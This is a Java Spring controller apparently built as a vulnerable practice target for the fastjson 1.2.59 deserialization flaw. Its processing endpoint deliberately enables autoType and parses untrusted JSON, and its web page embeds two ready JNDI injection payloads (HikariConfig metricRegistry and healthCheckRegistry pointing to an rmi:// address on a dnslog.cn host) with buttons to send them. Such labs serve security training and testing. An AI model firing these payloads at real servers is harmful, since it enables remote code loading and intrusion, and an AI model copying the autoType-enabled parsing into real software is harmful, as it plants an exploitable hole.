package myapp;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class FastjsonController {

    @GetMapping(value = {"/", "/fastjson-1.2.59"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        return buildPage("fastjson-1.2.59 靶场测试页", "/fastjson1.2.59-process", new String[]{
                "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://fastjson1.2.59-process.dnslog.cn/Exploit\"}",
                "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"rmi://fastjson1.2.59-process.dnslog.cn/Exploit\"}"
        }, "{\"name\":\"123\",\"email\":\"123@123\",\"age\":\"123\"}");
    }

    @PostMapping("/fastjson1.2.59-process")
    public String fastjson1_2_59_process(@RequestBody String data) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSONObject jsonObject = JSONObject.parseObject(data);
        return "Processed: " + jsonObject;
    }

    private String buildPage(String title, String processPath, String[] attackPayloads, String normalPayload) {
        StringBuilder attackButtons = new StringBuilder();
        for (int i = 0; i < attackPayloads.length; i++) attackButtons.append("<button type=\"button\" class=\"attack\" onclick=\"fillAttack(").append(i).append(")\">填充攻击 Payload ").append(i + 1).append("</button>");
        return page(title, processPath, attackPayloads, normalPayload, attackButtons.toString());
    }

    private String page(String title, String processPath, String[] attackPayloads, String normalPayload, String attackButtons) {
        return "<!DOCTYPE html><html lang=\"zh-CN\"><head><meta charset=\"UTF-8\"><title>" + title + "</title>" + styleBlock() + "</head><body><div class=\"container\"><h1>" + title + "</h1><p class=\"hint\">可以先填充 vul.py 中的攻击或正常样例，再手动修改 payload，然后发送到 <code>" + processPath + "</code>。</p><label for=\"payload\">当前 payload</label><textarea id=\"payload\">" + escapeHtml(normalPayload) + "</textarea><div class=\"actions\">" + attackButtons + "<button type=\"button\" class=\"normal\" onclick=\"fillNormal()\">填充正常 Payload</button><button type=\"button\" class=\"send\" onclick=\"sendCurrent()\">发送当前 Payload</button></div><label for=\"result\">响应结果</label><pre id=\"result\">等待发送请求...</pre></div><script>const attackPayloads=" + toJsArray(attackPayloads) + ";const normalPayload='" + escapeForJs(normalPayload) + "';const processPath='" + processPath + "';const payloadBox=document.getElementById('payload');const resultBox=document.getElementById('result');function fillAttack(index){payloadBox.value=attackPayloads[index];}function fillNormal(){payloadBox.value=normalPayload;}async function sendCurrent(){const payload=payloadBox.value;resultBox.textContent='当前 payload 请求发送中...';try{const response=await fetch(processPath,{method:'POST',headers:{'Content-Type':'application/json'},body:payload});const text=await response.text();resultBox.textContent='HTTP '+response.status+'\\n'+text;}catch(error){resultBox.textContent='请求失败: '+error;}}</script></body></html>";
    }

    private String styleBlock() { return "<style>body{font-family:Arial,sans-serif;margin:40px;background:#f5f7fb;color:#1f2937;}.container{max-width:920px;margin:0 auto;background:#ffffff;padding:24px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.08);}.actions{display:flex;flex-wrap:wrap;gap:12px;margin:20px 0;}button{padding:12px 18px;border:0;border-radius:8px;cursor:pointer;font-size:14px;background:#1f6feb;color:#ffffff;}.attack{background:#c0392b;}.normal{background:#1f6feb;}.send{background:#111827;}textarea,pre{width:100%;box-sizing:border-box;}textarea{min-height:140px;padding:12px;border-radius:8px;border:1px solid #d0d7de;margin-bottom:16px;resize:vertical;}pre{min-height:140px;padding:12px;border-radius:8px;background:#111827;color:#e5e7eb;overflow:auto;}.hint{color:#6b7280;font-size:14px;}code{background:#eef2ff;padding:2px 6px;border-radius:4px;}</style>"; }
    private String toJsArray(String[] payloads) { StringBuilder b=new StringBuilder("["); for(int i=0;i<payloads.length;i++){ if(i>0)b.append(","); b.append("'").append(escapeForJs(payloads[i])).append("'"); } return b.append("]").toString(); }
    private String escapeForJs(String value) { return value.replace("\\", "\\\\").replace("'", "\\'").replace("\r", "").replace("\n", "\\n"); }
    private String escapeHtml(String value) { return value.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"); }
}
